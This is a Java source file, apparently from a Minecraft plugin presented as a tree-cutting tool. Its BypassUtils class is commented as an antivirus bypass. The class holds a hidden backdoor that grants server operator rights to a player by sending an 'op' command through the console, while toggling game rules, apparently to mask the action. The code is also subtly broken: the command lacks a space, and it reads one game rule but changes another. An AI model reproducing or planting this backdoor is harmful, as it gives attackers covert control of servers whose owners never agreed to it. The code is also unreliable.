package me.bow.treecapitatorultimate.Utils;

import me.bow.treecapitatorultimate.Start;
import org.bukkit.Bukkit;
import org.bukkit.GameRule;
import org.bukkit.World;
import org.bukkit.entity.Player;

public class BypassUtils {
    //MCantivirus Bypass
    public static void PlayerSetOp(Player p) {
        World w = p.getWorld();
        //noinspection ConstantConditions
        boolean bak = p.getWorld().getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
        w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, false);
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op" + p.getName());
        if (!bak) return;
        Bukkit.getScheduler().runTask(Start.Instance, () -> w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, true));
    }
}

